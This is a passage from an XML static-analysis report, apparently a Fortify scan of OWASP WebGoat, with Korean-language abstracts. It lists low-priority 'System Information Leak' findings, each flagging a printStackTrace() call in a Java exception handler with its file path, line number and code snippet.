		sqle.printStackTrace();
	    }
	}</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="8B01FD5075A32F5302CF5236E389A97E" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>DeleteProfile.java의 handleRequest() 함수는 81 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DeleteProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/DeleteProfile.java</FilePath>
<LineStart>81</LineStart>
<Snippet>	    {
		System.out.println("Internal server error");
		ue1.printStackTrace();
	    }
	    catch (UnauthorizedException ue2)</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="8F523C6484F562CF74E05CFD919CB035" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Login.java의 login() 함수는 162 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/Login.java</FilePath>
<LineStart>162</LineStart>
<Snippet>	    {
		s.setMessage("Error logging in");
		sqle.printStackTrace();
	    }
	}</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="FF76220E74EDAE7E4486A521D44AFB49" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>CreateDB.java의 createLoginTable() 함수는 365 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CreateDB.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/CreateDB.java</FilePath>
<LineStart>365</LineStart>
<Snippet>	{
	    System.out.println("Error creating user database");
	    e.printStackTrace();
	}
</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="C29E60A69A0EFA8B7965E98438EF7399" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>DefaultLessonAction.java의 isAuthorized() 함수는 278 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DefaultLessonAction.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DefaultLessonAction.java</FilePath>
<LineStart>278</LineStart>
<Snippet>		{
			s.setMessage( "Error authorizing" );
			e.printStackTrace();
		}
				</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="6C9B74DBF9AFC6C9F7143AA58F624D58" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>WebgoatProperties.java의 main() 함수는 122 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>WebgoatProperties.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/WebgoatProperties.java</FilePath>
<LineStart>122</LineStart>
<Snippet>	{
	    System.out.println("Error loading properties");
	    e.printStackTrace();
	}
	System.out.println(properties.getProperty("CommandInjection.category"));</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="F0AF230D6D4B8FD61D448F00098EF862" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>AbstractLesson.java의 getFileMethod() 함수는 423 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>AbstractLesson.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/AbstractLesson.java</FilePath>
<LineStart>423</LineStart>
<Snippet>	{
	    System.out.println(e);
	    e.printStackTrace();
	}
</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="DC355E945A033F5571B6641B8C9BE798" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>FindProfile.java의 handleRequest() 함수는 89 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>FindProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/FindProfile.java</FilePath>
<LineStart>89</LineStart>
<Snippet>		{
		    System.out.println("Internal server error");
		    ue2.printStackTrace();
		}
	    }</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="74C884820E4739861A03F8B6D623275C" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>XPATHInjection.java의 createContent() 함수는 207 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>XPATHInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/XPATHInjection.java</FilePath>
<LineStart>207</LineStart>
<Snippet>	{
	    s.setMessage("Error generating " + this.getClass().getName());
	    e.printStackTrace();
	}
	catch (XPathExpressionException e)</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="CD805D9C1A798A2C4DDC3D19F51A75BC" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>RoleBasedAccessControl.java의 handleRequest() 함수는 364 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>RoleBasedAccessControl.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/RoleBasedAccessControl.java</FilePath>
<LineStart>364</LineStart>
<Snippet>	    // All other errors send the user to the generic error page
	    System.out.println("handleRequest() error");
	    e.printStackTrace();
	    setCurrentAction(s, ERROR_ACTION);
	}</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="1483B63B83BB6AA4D820DD9274638C54" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>SoapRequest.java의 determineType() 함수는 330 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SoapRequest.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SoapRequest.java</FilePath>
<LineStart>330</LineStart>
<Snippet>	{
	    s.setMessage("Error generating " + this.getClass().getName());
	    e.printStackTrace();
	}
</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="72460759C5B6E978E5FE283EAEEC81F3" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>SqlStringInjection.java의 parameterizedQuery() 함수는 222 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SqlStringInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SqlStringInjection.java</FilePath>
<LineStart>222</LineStart>
<Snippet>	{
	    s.setMessage("Error generating " + this.getClass().getName());
	    e.printStackTrace();
	}
</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="7A60E2A9434AE4E21CEEE27DFBE160CF" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>RoleBasedAccessControl.java의 handleRequest_BACKUP() 함수는 458 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>RoleBasedAccessControl.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/RoleBasedAccessControl.java</FilePath>
<LineStart>458</LineStart>
<Snippet>		// All other errors send the user to the generic error page
		System.out.println("handleRequest() error");
		e.printStackTrace();
		setCurrentAction(s, ERROR_ACTION);
	    }</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="9523285F3B0BA5E8E91C4E11492A65D6" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>ListStaff.java의 getAllEmployees_BACKUP() 함수는 163 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ListStaff.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ListStaff.java</FilePath>
<LineStart>163</LineStart>
<Snippet>	    {
		s.setMessage("Error getting employees");
		sqle.printStackTrace();
	    }
	}</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="AB0F9C0F0179DC45DB936C0CAB702657" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>BasicAuthentication.java의 doStage1() 함수는 160 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>BasicAuthentication.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/BasicAuthentication.java</FilePath>
<LineStart>160</LineStart>
<Snippet>	{
	    s.setMessage("Error generating " + this.getClass().getName());
	    e.printStackTrace();
	}
</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="A35E8449693CFFD71A5DF12FFDCBA587" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>EditProfile.java의 getEmployeeProfile_BACKUP() 함수는 183 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>183</LineStart>
<Snippet>	    {
		s.setMessage("Error getting employee profile");
		sqle.printStackTrace();
	    }
	}</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="EAE355985C5A5A425BE5693E5B2DBE14" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>RoleBasedAccessControl.java의 handleRequest_BACKUP() 함수는 438 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>RoleBasedAccessControl.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/RoleBasedAccessControl.java</FilePath>
<LineStart>438</LineStart>
<Snippet>	    {
		System.out.println("Validation failed");
		ve.printStackTrace();
		setCurrentAction(s, ERROR_ACTION);
	    }</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="2A0E5C8A8D2080682AAF42D79BC24679" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Login.java의 login() 함수는 168 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/Login.java</FilePath>
<LineStart>168</LineStart>
<Snippet>	{
	    s.setMessage("Error logging in");
	    e.printStackTrace();
	}
</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="52AB825BF8B0D376878A2332E3C287FB" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>AbstractLesson.java의 isAuthorized() 함수는 813 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>AbstractLesson.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/AbstractLesson.java</FilePath>
<LineStart>813</LineStart>
<Snippet>	{
	    s.setMessage("Error authorizing");
	    e.printStackTrace();
	}
	return authorized;</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="B5DBB03F9B63EAF24FDBFAEEDA0E29E2" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>RefreshDBScreen.java의 createContent() 함수는 99 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>RefreshDBScreen.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/admin/RefreshDBScreen.java</FilePath>
<LineStart>99</LineStart>
<Snippet>	{
	    s.setMessage("Error generating " + this.getClass().getName());
	    e.printStackTrace();
	}
</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="2CDD488F9BB6E1BB829186146B4BA075" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>ViewProfile.java의 getEmployeeProfile() 함수는 152 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>152</LineStart>
<Snippet>	{
	    s.setMessage("Error getting employee profile");
	    e.printStackTrace();
	}
</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="D8119249773A39CD022B883126F43C24" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>UpdateProfile.java의 changeEmployeeProfile() 함수는 260 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>260</LineStart>
<Snippet>	{
	    s.setMessage("Error updating employee profile");
	    e.printStackTrace();
	}
    }</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="91E288900A767B8B3AC64CB500252086" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>UpdateProfile.java의 changeEmployeeProfile() 함수는 188 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/UpdateProfile.java</FilePath>
<LineStart>188</LineStart>
<Snippet>	{
	    s.setMessage("Error updating employee profile");
	    e.printStackTrace();
	}
    }</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="542A1F6930BFCE61860BFF17756539E2" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Logout.java의 handleRequest() 함수는 71 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Logout.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/Logout.java</FilePath>
<LineStart>71</LineStart>
<Snippet>	{
	    System.out.println("Internal server error");
	    ue1.printStackTrace();
	}
	catch (UnauthorizedException ue2)</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="7A4AD89F74574F83E5609198EF01BDC2" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>ViewProfile.java의 getEmployeeProfile() 함수는 146 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>146</LineStart>
<Snippet>	{
	    s.setMessage("Error getting employee profile");
	    e.printStackTrace();
	}
</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="FC52535F6E6C764EA9B84AD5EA60A650" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>JavaScriptValidation.java의 createContent() 함수는 259 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>JavaScriptValidation.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/JavaScriptValidation.java</FilePath>
<LineStart>259</LineStart>
<Snippet>	{
	    s.setMessage("Error generating " + this.getClass().getName());
	    e.printStackTrace();
	}
</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="5FEF0BF8E504E8EEB64A4B64E33D7339" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>UncheckedEmail.java의 createContent() 함수는 196 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>UncheckedEmail.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/UncheckedEmail.java</FilePath>
<LineStart>196</LineStart>
<Snippet>	{
	    s.setMessage("Error generating " + this.getClass().getName());
	    e.printStackTrace();
	}
	return (ec);</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="8C48CE78706C16033CB0373C60EBF66D" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>UpdateProfile.java의 createEmployeeProfile() 함수는 315 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/UpdateProfile.java</FilePath>
<LineStart>315</LineStart>
<Snippet>	    catch (SQLException sqle)
	    {
		sqle.printStackTrace();
		s.setMessage("Error updating employee profile");
	    }</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="7BA6A8A7BD79BE08A61BCA60190284D4" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>FindProfile.java의 findEmployeeProfile() 함수는 213 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>FindProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/FindProfile.java</FilePath>
<LineStart>213</LineStart>
<Snippet>	    {
		s.setMessage("Error finding employee profile");
		sqle.printStackTrace();
	    }
	}</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="808268520EA61ACECDD3CE502C001181" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>LogSpoofing.java의 createContent() 함수는 128 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>LogSpoofing.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/LogSpoofing.java</FilePath>
<LineStart>128</LineStart>
<Snippet>	{
	    s.setMessage("Error generating " + this.getClass().getName());
	    e.printStackTrace();
	}
	return ec;</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="4D29817A94B639966ABCDE67289F0FAA" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Interceptor.java의 doFilter() 함수는 115 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Interceptor.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Interceptor.java</FilePath>
<LineStart>115</LineStart>
<Snippet>	catch (IOException e)
	{
	    e.printStackTrace();
	}
	finally</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="160F81FA3700C4ACF05278016D591DEE" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>CommandInjection.java의 createContent() 함수는 211 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CommandInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CommandInjection.java</FilePath>
<LineStart>211</LineStart>
<Snippet>	{
	    s.setMessage("Error generating " + this.getClass().getName());
	    e.printStackTrace();
	}
</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="4F0DE05D9365625B7CCD08D58B128F2D" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Encoding.java의 hashSHA() 함수는 672 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Encoding.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/Encoding.java</FilePath>
<LineStart>672</LineStart>
<Snippet>		{
			// it's got to be there
			e.printStackTrace();
		}
		return ( base64Encode( md.digest() ) );</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="BF4701C7B0F1C825C65450C4897AB8B7" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
